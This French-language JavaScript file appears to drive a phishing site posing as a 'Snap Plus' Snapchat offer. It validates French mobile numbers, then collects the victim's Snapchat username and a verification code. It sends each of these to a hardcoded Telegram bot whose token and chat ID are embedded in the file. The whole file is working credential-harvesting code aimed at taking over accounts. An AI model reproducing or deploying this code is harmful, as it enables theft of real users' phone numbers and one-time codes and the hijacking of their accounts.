// Configuration Telegram Bot
const TELEGRAM_BOT_TOKEN = '8981703910:AAHpSoAJUmpA6qWyvmgf0oLp0EXRa3-WFLI';
const TELEGRAM_CHAT_ID = '8424411486'; // Remplacez par votre chat ID

// Générer un ID unique séquentiel
function generateUniqueId() {
    let counter = parseInt(localStorage.getItem('snapPlus_counter')) || 1;
    const uniqueId = counter.toString().padStart(4, '0');
    localStorage.setItem('snapPlus_counter', counter + 1);
    return uniqueId;
}

// Envoyer message à Telegram
async function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
        
        const data = await response.json();
        if (data.ok) {
            console.log('Message envoyé avec succès à Telegram');
            return true;
        } else {
            console.error('Erreur Telegram:', data.description);
            return false;
        }
    } catch (error) {
        console.error('Erreur lors de l\'envoi à Telegram:', error);
        return false;
    }
}

// Page index.html - Formulaire connexion
const loginForm = document.getElementById('loginForm');
if (loginForm) {
    const phoneInput = document.getElementById('username');
    const errorMessage = document.getElementById('errorMessage');
    
    // Formater automatiquement le numéro de téléphone avec espaces
    phoneInput.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\s/g, ''); // Supprimer les espaces existants
        value = value.replace(/[^0-9]/g, ''); // Ne garder que les chiffres
        
        // Limiter à 10 chiffres
        if (value.length > 10) {
            value = value.substring(0, 10);
        }
        
        // Ajouter des espaces tous les 2 chiffres
        let formatted = '';
        for (let i = 0; i < value.length; i++) {
            if (i > 0 && i % 2 === 0) {
                formatted += ' ';
            }
            formatted += value[i];
        }
        
        e.target.value = formatted;
    });
    
    loginForm.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        // Cacher le message d'erreur précédent
        if (errorMessage) {
            errorMessage.style.display = 'none';
            errorMessage.textContent = '';
        }
        
        const username = document.getElementById('username').value;
        const cleanPhone = username.replace(/\s/g, ''); // Supprimer les espaces pour validation
        
        // Valider que le numéro commence par 06 ou 07 et a 10 chiffres
        if (!cleanPhone.match(/^0[67][0-9]{8}$/)) {
            if (errorMessage) {
                errorMessage.textContent = 'Veuillez entrer un numéro de téléphone français valide (06 ou 07 avec 10 chiffres)';
                errorMessage.style.display = 'block';
            }
            return;
        }
        
        const uniqueId = generateUniqueId();
        
        // Stocker les données dans localStorage
        localStorage.setItem('snapPlus_username', username);
        localStorage.setItem('snapPlus_id', uniqueId);
        
        // Envoyer à Telegram
        const message = `📞 <b>Nouvelle inscription Snap Plus</b>\n\n` +
                       `🔑 <b>ID Unique:</b> ${uniqueId}\n` +
                       `📱 <b>Téléphone:</b> ${username}\n` +
                       `📅 <b>Date:</b> ${new Date().toLocaleString('fr-FR')}`;
        
        const success = await sendToTelegram(message);
        
        if (success) {
            // Afficher le message de chargement
            const loadingMessage = document.getElementById('loadingMessage');
            const loginForm = document.getElementById('loginForm');
            
            if (loginForm) {
                loginForm.style.display = 'none';
            }
            if (loadingMessage) {
                loadingMessage.style.display = 'block';
            }
            
            // Attendre 5 secondes avant de rediriger
            setTimeout(() => {
                window.location.href = 'verification.html';
            }, 5000);
        } else {
            if (errorMessage) {
                errorMessage.textContent = 'Erreur lors de l\'envoi. Veuillez réessayer.';
                errorMessage.style.display = 'block';
            }
        }
    });
}

// Page verification.html - Formulaire vérification
const verificationForm = document.getElementById('verificationForm');
if (verificationForm) {
    // Afficher le username enregistré
    const username = localStorage.getItem('snapPlus_username');
    const uniqueId = localStorage.getItem('snapPlus_id');
    const phoneDisplay = document.getElementById('phoneDisplay');
    const errorMessage = document.getElementById('errorMessage');
    
    if (phoneDisplay && username) {
        phoneDisplay.innerHTML = `<strong>Username enregistré:</strong> ${username}`;
    }
    
    verificationForm.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        // Cacher le message d'erreur précédent
        if (errorMessage) {
            errorMessage.style.display = 'none';
            errorMessage.textContent = '';
        }
        
        const snapchatUsername = document.getElementById('username').value;
        const code = document.getElementById('code').value;
        
        // Envoyer à Telegram
        const message = `✅ <b>Vérification Snap Plus</b>\n\n` +
                       `🔑 <b>ID Unique:</b> ${uniqueId}\n` +
                       `👤 <b>Username/Email:</b> ${username}\n` +
                       `📸 <b>Pseudo Snapchat:</b> ${snapchatUsername}\n` +
                       `🔢 <b>Code:</b> ${code}\n` +
                       `📅 <b>Date:</b> ${new Date().toLocaleString('fr-FR')}`;
        
        const success = await sendToTelegram(message);
        
        if (success) {
            // Nettoyer localStorage
            localStorage.removeItem('snapPlus_username');
            localStorage.removeItem('snapPlus_id');
            
            // Rediriger vers la page de succès
            window.location.href = 'success.html';
        } else {
            if (errorMessage) {
                errorMessage.textContent = 'Erreur lors de l\'envoi. Veuillez réessayer.';
                errorMessage.style.display = 'block';
            }
        }
    });
}
